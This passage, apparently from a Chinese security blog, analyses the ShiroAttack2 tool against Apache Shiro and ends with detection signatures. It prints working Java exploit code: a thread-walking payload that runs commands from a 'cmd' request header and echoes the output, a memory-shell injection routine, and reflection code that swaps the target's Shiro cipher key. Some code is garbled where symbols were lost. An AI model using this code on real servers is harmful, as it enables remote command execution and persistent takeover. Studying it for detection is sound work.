    Thread[] var5 = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads");
            for (int var6 = 0; var6  max_depth||(req!=null&&resp!=null)){
                return;
            }
        //开始时start传入的是Thread.currentThread()对象
            Class n=start.getClass();
            do{
               //获取当前对象中保存的属性
                for (Field declaredField : n.getDeclaredFields()) {
                    declaredField.setAccessible(true);
                    Object obj = null;
                    try{
                        //判断属性是否为static，是则跳过
                        if(Modifier.isStatic(declaredField.getModifiers())){
                            //静态字段
                            //obj = declaredField.get(null);
                        }else{
                            obj = declaredField.get(start);
                        }
                        if(obj != null){
                            //不是数组直接调用proc方法检查obj中是否为request或response对象
                            if(!obj.getClass().isArray()){
                                proc(obj,depth);
                            }else{
                             //是数组则判断持有的对象是否为基本类型，不是基本类型才会遍历数组并判断是否为request或response对象
                                if(!obj.getClass().getComponentType().isPrimitive()) {
                                    for (Object o : (Object[]) obj) {
                                        proc(o, depth);
                                    }
                                }
                            }
                        }
                    }catch (Exception e){
                        e.printStackTrace();
                    }
                }
            }while(
                //获取父类并遍历属性
                    (n = n.getSuperclass())!=null
            );
        }
判断当前对象是否持有request和response类型，如果是则执行命令并写入Response。
    private static void proc(Object obj,int depth){
         //如果遍历层数已经是最大层数则返回
            if(depth > max_depth||(req!=null&&resp!=null)){
                return;
            }
         // 如果该类型是java.lang包下的并且已经处理过了则跳过
            if(!isSkiped(obj)){
                //判断obj类型是否为HttpServletRequest.class的子类
                if(req==null&&ReqC.isAssignableFrom(obj.getClass())){
                    req = (HttpServletRequest)obj;
                    if(req.getHeader("cmd")==null)
                        req=null;
                //判断obj类型是否为HttpServletResponse.class的子类
                }else if(resp==null&&RespC.isAssignableFrom(obj.getClass())){
                    resp = (HttpServletResponse) obj;
                }
                //如果获取到request和response对象，则执行命令并写入
                if(req!=null&&resp!=null){
                    try {
                        PrintWriter os = resp.getWriter();
                        Process proc = Runtime.getRuntime().exec(req.getHeader("cmd"));
                        proc.waitFor();
                        Scanner scanner = new Scanner(proc.getInputStream());
                        scanner.useDelimiter("\\A");
                        os.print("Test by fnmsd "+scanner.next());
                        os.flush();
                    }catch (Exception e){
                    }
                    return;
                }
                //继续遍历
                Find(obj,depth+1);
            }
        }
### 内存马
由于注入内存马的代码量比较大，直接将数据带到请求头中会导致请求头过大而注入失败，所以这里作者将实际内存马的内容和注入的代码分开，post的参数dy中才是真正注入内存马的代码。
    public void injectMem(String memShellType, String shellPass, String shellPath) {
        //获取rememberMe的内容，这里传入的回显类是InjectMemTool，也就是InjectMemTool的字节码将会被放到TemplateImpl->_bytecodes属性中
            String injectRememberMe = this.GadgetPayload(gadget, "InjectMemTool", realShiroKey);
            if (injectRememberMe != null) {
                //请求头中传入shell密码和路径。
                HashMap header = new HashMap();
                header.put("Cookie", injectRememberMe);
                header.put("p", shellPass);
                header.put("path", shellPath);
                try {
                    //根据内存马的类型得到对应的字节码，base64后传给dyv参数。
                    String b64Bytecode = MemBytes.getBytes(memShellType);
                    String postString = "dy=" + b64Bytecode;
                    String result = this.bodyHttpRequest(header, postString);
                    //返回Success则代表注入成功
                    if (result.contains("->|Success||") && result.contains("| objMap = (java.util.HashMap) obj;
            //遍历filterConfigs
            java.util.Iterator> entries = objMap.entrySet().iterator();
            while (entries.hasNext()) {
                Map.Entry entry = entries.next();
                //检测key是否为shiroFilterFactoryBean
                if (entry.getKey().equals("shiroFilterFactoryBean")) {
                    obj = entry.getValue();
                    field = obj.getClass().getDeclaredField("filter");
                    field.setAccessible(true);
                    obj = field.get(obj);
                    field = obj.getClass().getSuperclass().getDeclaredField("securityManager");
                    field.setAccessible(true);
                    obj = field.get(obj);
                    field = obj.getClass().getSuperclass().getDeclaredField("rememberMeManager");
                    field.setAccessible(true);
                    obj = field.get(obj);
                    //通过反射调用setEncryptionCipherKey修改加密key
                    java.lang.reflect.Method setEncryptionCipherKey = obj.getClass().getSuperclass().getDeclaredMethod("setEncryptionCipherKey", new Class[]{byte[].class});
                    byte[] bytes = this.base64Decode("FcoRsBKe9XB3zOHbxTG0Lw==");
                    setEncryptionCipherKey.invoke(obj, new Object[]{bytes});
                       //通过反射调用setDecryptionCipherKey修改解密key
                    java.lang.reflect.Method setDecryptionCipherKey = obj.getClass().getSuperclass().getDeclaredMethod("setDecryptionCipherKey", new Class[]{byte[].class});
                    setDecryptionCipherKey.invoke(obj, new Object[]{bytes});
                }
            }
但是这种方式有一个问题，如果我设置`ShiroFilterFactoryBean`时设置了name属性，那么遍历`filterConfigs`是，保存`ShiroFilterFactoryBean`的Filter的名称就会是`shiroFilter`，所以会修改失败。
    @Bean(
                name = {"shiroFilter"}
        )
        ShiroFilterFactoryBean shiroFilterFactoryBean(SecurityManager securityManager) {
            ShiroFilterFactoryBean bean = new ShiroFilterFactoryBean();
            bean.setSecurityManager(securityManager);
            bean.setLoginUrl("/login");
            bean.setUnauthorizedUrl("/unauth");
            Map map = new LinkedHashMap();
            map.put("/doLogin", "anon");
            map.put("/index/**", "authc");
            bean.setFilterChainDefinitionMap(map);
            return bean;
        }
但是无论有没有配置name属性，filter属性中保存的filter的类名一定是`ShiroFilterFactoryBean`,所以我们可以先获取filter属性，然后查看类名是否为`ShiroFilterFactoryBean`，如果是则通过反射调用修改key。
    while (entries.hasNext()) {
                Map.Entry entry = entries.next();
                obj = entry.getValue();
                //先获取filter属性
                field = obj.getClass().getDeclaredField("filter");
                field.setAccessible(true);
                obj = field.get(obj);
                //判断保存的类型是否为ShiroFilterFactoryBean
                if (obj.getClass().toString().contains("ShiroFilterFactoryBean")) {
                    field = obj.getClass().getSuperclass().getDeclaredField("securityManager");
                    field.setAccessible(true);
                    obj = field.get(obj);
                    field = obj.getClass().getSuperclass().getDeclaredField("rememberMeManager");
                    field.setAccessible(true);
                    obj = field.get(obj);
                    java.lang.reflect.Method setEncryptionCipherKey = obj.getClass().getSuperclass().getDeclaredMethod("setEncryptionCipherKey", new Class[]{byte[].class});
                    byte[] bytes = this.base64Decode("FcoRsBKe9XB3zOHbxTG0Lw==");
                    setEncryptionCipherKey.invoke(obj, new Object[]{bytes});
                    java.lang.reflect.Method setDecryptionCipherKey = obj.getClass().getSuperclass().getDeclaredMethod("setDecryptionCipherKey", new Class[]{byte[].class});
                    setDecryptionCipherKey.invoke(obj, new Object[]{bytes});
                }
            }
## 总结
通过学习师傅写的工具，对很多技术的实现细节有了一些了解，确实也学到了很多。最后总结部分我想简单聊一下这个工具的利用特征。
  * ·在验证key或者爆破key前，会发送RemeberMe=1，如果检测到Cookie中包含`RemeberMe=1`直接将请求断开，会导致这个工具无法检测密钥，后续的功能也将无法用。
  * 利用链爆破部分会发送`Ctmd:08fb41620aa4c498a1f2ef09bbc1183c`作为是否可以回显的标志，这一部分是硬编码的，所以如果检测到包含`Ctmd:08fb41620aa4c498a1f2ef09bbc1183c`，也是有人正在利用该工具检测shiro
  * 内存马注入时，会在请求中加上`p`和`path`参数，并且会在post请求中加上`dy`参数。
## 参考
  * [ShiroAttack2](https://github.com/SummerSec/ShiroAttack2)
  * [Java内存马：一种Tomcat全版本获取StandardContext的新方法](https://xz.aliyun.com/t/9914#toc-6)
  * [Java中间件通用回显方法的问题及处理(7.7更新)](https://blog.csdn.net/fnmsd/article/details/106890242?spm=1001.2014.3001.5501)